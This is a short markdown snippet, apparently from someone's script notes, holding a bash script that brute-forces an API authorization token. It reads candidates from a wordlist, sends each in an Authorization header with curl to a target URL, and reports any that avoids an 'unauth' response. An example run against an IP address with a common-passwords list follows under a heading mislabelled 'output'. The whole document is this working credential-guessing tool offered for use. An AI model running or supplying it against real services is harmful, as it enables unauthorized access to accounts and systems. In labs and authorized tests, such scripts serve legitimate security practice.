# Scripts
Bash script to read different tokens from a file and pass them to `curl` command to find out the valid token for authorization
```bash
#!/bin/bash
while read token; do
content=$(curl -s -H 'Authorization: Token '"$token" $1)
if echo "$content" | grep -qi "unauth"; then
continue
else
echo "Found token : $token"
fi
done <$2
```
output
```sh
./brute.sh 192.186.248.3 wordlists/100-common-passwords.txt
```

